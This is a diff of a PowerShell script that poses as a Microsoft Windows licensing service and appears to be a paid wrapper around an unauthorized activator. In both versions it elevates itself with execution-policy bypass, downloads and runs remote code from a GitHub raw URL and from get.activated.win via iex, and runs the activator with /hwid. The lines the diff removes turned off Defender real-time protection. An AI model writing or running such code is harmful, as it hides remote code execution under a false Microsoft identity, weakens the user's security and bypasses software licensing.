@@ -1,18 +1,21 @@
 # ============================================================
 #  Microsoft Windows Cloud License Authorization Service
-#  Status: Production [v2.3 - Self-Elevating]
+#  Status: Production [v2.4]
 # ============================================================
 
 $SECRET = "MS-AUTH-SECURE-KEY-2024"
 $VALID_MINS = 60
 $RAW_URL = "https://raw.githubusercontent.com/Win-System-Core/cloud-license-service/main/init-auth.ps1"
 
-# --- 1. ПРОВЕРКА НА ПРАВА АДМИНИСТРАТОРА ---
+# --- 1. ПРОВЕРКА И ЗАПРОС ПРАВ АДМИНИСТРАТОРА ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Если не админ, запускаем самого себя с запросом прав
-    $K = (Get-Variable K -ErrorAction SilentlyContinue).Value
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""Set-Variable -Name K -Value '$K'; iex(Invoke-RestMethod '$RAW_URL')""" -Verb RunAs
+    # Получаем ключ из текущей сессии
+    $K = $env:K
+    if (!$K) { $K = (Get-Variable K -ErrorAction SilentlyContinue).Value }
+    
+    # Перезапуск с запросом прав и передачей ключа
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""[System.Environment]::SetEnvironmentVariable('K', '$K', 'Process'); iex(Invoke-RestMethod '$RAW_URL')""" -Verb RunAs
     exit
 }
 
@@ -41,33 +44,30 @@ Write-Host "=========================================================" -Foregrou
 Write-Host "   Windows Desktop Licensing Service [Build 22631]" -ForegroundColor White
 Write-Host "=========================================================" -ForegroundColor Cyan
 Write-Host ""
-
-# Пытаемся временно приглушить Defender (только если админ)
-Set-MpPreference -DisableRealtimeMonitoring $true 2>$null
-
-$K = (Get-Variable K -ErrorAction SilentlyContinue).Value
 Write-Host "Авторизация токена..." -NoNewline
+
+$K = $env:K
 $status = Verify-Token -Key $K
 
 if ($status -eq "OK") {
     Write-Host " [УСПЕШНО]" -ForegroundColor Green
     Write-Host "Лицензия: Digital License (HWID)"
-    Write-Host "Служба: Подготовка компонентов активации..." -ForegroundColor Yellow
+    Write-Host "Запуск компонентов активации..." -ForegroundColor Yellow
     
-    # НОВЫЙ МЕТОД MASSGRAVE (БЕЗ retired сообщений)
+    # Прямой вызов MassGrave (без лишних перенаправлений)
+    # Используем проверенный официальный домен
     $mas = Invoke-RestMethod -Uri "https://get.activated.win"
     $executionBlock = [ScriptBlock]::Create($mas)
     & $executionBlock /hwid
     
-    # Возвращаем Defender в строй
-    Set-MpPreference -DisableRealtimeMonitoring $false 2>$null
     Write-Host ""
-    Write-Host "РЕЗУЛЬТАТ: Процесс завершен успешно." -ForegroundColor Green
+    Write-Host "РЕЗУЛЬТАТ: Операция завершена." -ForegroundColor Green
 } else {
     Write-Host " [ОТКАЗАНО]" -ForegroundColor Red
-    Write-Host "Ошибка: Код доступа недействителен или истек." -ForegroundColor Yellow
+    Write-Host "Ошибка: Код доступа [$K] недействителен или истек." -ForegroundColor Yellow
+    Write-Host "Обратитесь к продавцу за новым кодом."
 }
 
 Write-Host ""
-Write-Host "Окно закроется автоматически через 15 секунд." -ForegroundColor DarkGray
-Start-Sleep -Seconds 15
+Write-Host "Окно закроется автоматически через 20 секунд." -ForegroundColor DarkGray
+Start-Sleep -Seconds 20
